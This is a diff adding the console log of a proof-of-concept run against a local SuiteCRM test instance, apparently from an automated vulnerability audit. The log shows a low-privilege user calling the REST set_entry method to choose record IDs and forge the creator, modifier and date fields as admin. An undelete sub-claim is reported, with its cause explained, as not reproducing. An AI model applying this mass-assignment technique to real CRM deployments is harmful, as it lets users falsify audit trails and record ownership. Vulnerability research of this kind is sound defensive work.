@@ -1,0 +1,24 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-077/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-077/../.venv
+========================================================================
+VULN-077: set_entry mass-assignment -- chosen id, audit-field forgery, unchecked undelete
+target: http://localhost:33116
+========================================================================
+[SETUP] admin web + legacy REST session
+[INFO] admin user id = 1
+[SETUP] create low-priv user, deny Accounts 'delete' via a throwaway Role (Save/edit stays default-allowed)
+[OK] low-priv user mod_f1c0df4f id=8b9f9dfc-0bd8-45f9-b862-07125cc0bbde, role 01b6cdef-93c7-4b3f-9890-2979a87713a9 denies Accounts delete
+[STEP] PART A: low-priv set_entry(Accounts) choosing id=89caf3bf-0636-4a41-91b0-23d225bc16e4, created_by=modified_user_id=admin(1), date_*=2000-01-01 00:00:00
+[INFO] set_entry response: {'id': '89caf3bf-0636-4a41-91b0-23d225bc16e4', 'entry_list': {'id': {'name': 'id', 'value': '89caf3bf-0636-4a41-91b0-23d225bc16e4'}, 'name': {'name': 'name', 'value': 'Stage10 VULN-077 acct_077150ce'}, 'created_by': {'name': 'created_by', 'value': '1'}, 'modified_user_id': {'name': 'modified_user_id', 'value': '1'}, 'date_modified': {'name': 'date_modified', 'value': '2000-01-01 00:00:00'}, 'date_entered': {'name': 'date_entered', 'value': '2000-01-01 00:00:00'}}}
+[PROOF] DB row for chosen id: {'id': '89caf3bf-0636-4a41-91b0-23d225bc16e4', 'name': 'Stage10 VULN-077 acct_077150ce', 'created_by': '1', 'modified_user_id': '1', 'date_entered': '2000-01-01 00:00:00', 'date_modified': '2000-01-01 00:00:00'}
+[PROOF] chosen-id honored=True, created_by spoofed to admin (not the actual caller)=True, modified_user_id spoofed=True, date_entered/date_modified forged to 2000-01-01 00:00:00=True
+[STEP] PART B control: low-priv attempts to SET deleted=1 on a record -- must be BLOCKED (Role explicitly denies Accounts delete)
+[INFO] low-priv set deleted=1 on b95180da-bc18-45d8-8cb4-70d79a07416b -> {'name': 'Access Denied', 'number': 40, 'description': 'You do not have access'}
+[PROOF] control: record W still deleted=0 in DB (delete blocked) = True
+[STEP] PART B main: admin soft-deletes record Y, then low-priv sends deleted=0 for it
+[INFO] record Y=15ce23c7-487a-4e72-af6b-256ad2604e55 deleted flag after admin soft-delete: [{'deleted': '1'}]
+[INFO] low-priv (Accounts delete=NONE) set deleted=0 on Y -> {'id': '15ce23c7-487a-4e72-af6b-256ad2604e55', 'entry_list': {'id': {'name': 'id', 'value': '15ce23c7-487a-4e72-af6b-256ad2604e55'}, 'deleted': {'name': 'deleted', 'value': 0}}}
+[INFO] record Y deleted flag after low-priv undelete attempt: [{'deleted': '1'}]
+[INFO] Part B (undelete) DID NOT reproduce: DB deleted flag for Y is 1 after the low-priv call, despite the API echoing deleted=0 and the call not being blocked. Root cause: include/database/DBManager.php:2070-2073 updateSQL() skips writing the `deleted` column whenever the new value is falsy (comment: 'no need to clear deleted since we only update not deleted records anyway') -- so the missing ACL check on the populate loop is real but has no reachable effect for this specific sub-claim.
+[OK] Confirmed: low-priv set_entry caller controls the primary key and forges created_by/modified_user_id/date_entered/date_modified on insert -- none of which any EditView form exposes. (Part B 'undelete' sub-claim tested separately; see notes above/writeup.)
+==> VULN-077: CONFIRMED — chosen id=89caf3bf-0636-4a41-91b0-23d225bc16e4 honored (not create_guid()'d); created_by/modified_user_id forged to admin(1) though the caller was low-priv user 8b9f9dfc-0bd8-45f9-b862-07125cc0bbde; date_entered/date_modified forged to 2000-01-01 00:00:00; all DB-verified. Undelete sub-claim: tested, did NOT reproduce (see notes.md) -- updateSQL() skips the deleted column when falsy
